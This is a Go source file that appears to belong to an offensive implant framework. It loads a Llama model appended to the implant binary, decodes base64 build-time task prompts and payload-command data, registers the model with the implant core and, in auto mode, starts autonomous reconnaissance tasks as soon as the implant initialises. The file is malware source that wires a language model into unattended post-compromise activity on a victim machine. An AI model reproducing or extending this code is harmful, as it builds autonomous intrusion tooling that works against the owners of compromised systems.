//go:build llama_selfextract
// +build llama_selfextract

package llama

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"strconv"

	"github.com/r74tech/virga/internal/implant/config"
	"github.com/r74tech/virga/internal/implant/logger"
)

// This file is used when building with llama_selfextract tag
// In this mode, the model is appended to the binary and loaded via mmap

var embeddedModel []byte

func init() {
	log.Println("[Llama] Initializing self-extracting Llama model...")
	log.Printf("[Llama] Auto mode enabled: %v", config.BuildLlamaAutoMode == "true")
	log.Printf("[Llama] Initial tasks configured: %v", config.BuildLlamaInitialTasks != "")

	// Load from self-extracting binary (model appended to executable)
	if hasModel, modelSize, err := HasEmbeddedModel(); hasModel && err == nil {
		log.Printf("[Llama] Found self-contained model (%.2f GB), loading into memory...", float64(modelSize)/(1024*1024*1024))
		if modelData, err := LoadModelFromSelf(); err == nil {
			embeddedModel = modelData
			log.Printf("[Llama] Successfully loaded self-contained model (%.2f MB)", float64(len(embeddedModel))/(1024*1024))
		} else {
			log.Printf("[Llama] Failed to load self-contained model: %v", err)
			log.Println("[Llama] Warning: No model loaded")
			return
		}
	} else {
		log.Println("[Llama] Warning: No embedded model found in self-extracting binary")
		return
	}

	if embeddedModel == nil || len(embeddedModel) == 0 {
		log.Println("[Llama] Warning: No embedded model loaded")
		return
	}

	// Parse build-time configuration
	context := 8192
	if val, err := strconv.Atoi(config.BuildLlamaContext); err == nil && val > 0 {
		context = val
	}

	maxTokens := 2048
	if val, err := strconv.Atoi(config.BuildLlamaMaxTokens); err == nil && val > 0 {
		maxTokens = val
	}

	maxIterations := 50
	if val, err := strconv.Atoi(config.BuildLlamaMaxIterations); err == nil && val > 0 {
		maxIterations = val
	}

	temperature := 0.3
	if val, err := strconv.ParseFloat(config.BuildLlamaTemperature, 64); err == nil && val > 0 {
		temperature = val
	}

	gpuLayers := 0
	if val, err := strconv.Atoi(config.BuildLlamaGPULayers); err == nil && val >= 0 {
		gpuLayers = val
	}

	// Parse task prompts from build config
	taskPrompts := make(map[string]string)
	if config.BuildLlamaTaskPrompts != "" {
		if decoded, err := base64.StdEncoding.DecodeString(config.BuildLlamaTaskPrompts); err == nil {
			json.Unmarshal(decoded, &taskPrompts)
		}
	}

	// Parse payload command information from build config
	var payloadInfos []*PayloadCommandInfo
	if config.BuildLlamaPayloadInfos != "" {
		if decoded, err := base64.StdEncoding.DecodeString(config.BuildLlamaPayloadInfos); err == nil {
			var rawInfos []json.RawMessage
			if err := json.Unmarshal(decoded, &rawInfos); err == nil {
				for _, raw := range rawInfos {
					var info PayloadCommandInfo
					if err := json.Unmarshal(raw, &info); err == nil {
						payloadInfos = append(payloadInfos, &info)
					}
				}
			}
		}
	}

	// Configure based on build flags
	llamaConfig := Config{
		ModelData:      embeddedModel,
		UseMemory:      true,
		UseMmap:        false, // macOS uses memory loading instead of mmap to avoid llama.cpp issues
		Context:        context,
		GPULayers:      gpuLayers,
		Threads:        4,
		Temperature:    temperature,
		TopK:           40,
		TopP:           0.95,
		MaxTokens:      maxTokens,
		MaxIterations:  maxIterations,
		EnableAutoMode: config.BuildLlamaAutoMode == "true",
		SystemPrompt:   GetPromptByPreset(config.BuildLlamaSystemPrompt),
		TaskPrompts:    taskPrompts,
		PayloadInfos:   payloadInfos,
	}

	integration, err := NewLlamaIntegration(llamaConfig)
	if err != nil {
		log.Printf("Failed to initialize Llama integration: %v", err)
		return
	}

	// Register with implant core
	RegisterLlamaIntegration(integration)

	// Start task workers for background processing
	integration.StartWorkers()
	log.Printf("[Llama] Task workers started (count: %d)", llamaConfig.MaxWorkers)

	// Start initial reconnaissance if auto mode is enabled
	if llamaConfig.EnableAutoMode {
		log.Println("[Llama] Auto mode is enabled, preparing initial tasks...")
		// Parse initial tasks from build config
		if config.BuildLlamaInitialTasks != "" {
			log.Printf("[Llama] Decoding initial tasks from build config...")
			if decoded, err := base64.StdEncoding.DecodeString(config.BuildLlamaInitialTasks); err == nil {
				var tasks []struct {
					Type        string `json:"type"`
					Description string `json:"description"`
				}
				if err := json.Unmarshal(decoded, &tasks); err == nil && len(tasks) > 0 {
					log.Printf("[Llama] Starting %d initial tasks...", len(tasks))
					for _, task := range tasks {
						log.Printf("[Llama]   - Task: %s (%s)", task.Type, task.Description)
					}
					integration.RunInitialReconnaissanceWithTasks(tasks)
				} else {
					log.Printf("[Llama] Failed to parse initial tasks: %v", err)
					integration.RunInitialReconnaissance()
				}
			} else {
				log.Printf("[Llama] Failed to decode initial tasks: %v", err)
				integration.RunInitialReconnaissance()
			}
		} else {
			log.Println("[Llama] No initial tasks configured, using default reconnaissance")
			integration.RunInitialReconnaissance()
		}
	} else {
		log.Println("[Llama] Auto mode is disabled, skipping initial tasks")
	}

	modelSizeMB := float64(len(embeddedModel)) / (1024 * 1024)
	log.Printf("[Llama] Model initialized successfully (%.2f MB)", modelSizeMB)

	// Also log for visibility
	if implantLogger := logger.Get(); implantLogger != nil {
		implantLogger.LogLlama("Model initialization complete", map[string]interface{}{
			"model_size_mb": modelSizeMB,
		})
		if llamaConfig.EnableAutoMode {
			implantLogger.LogLlama("Autonomous mode enabled - starting initial reconnaissance tasks")
		}
	}
}
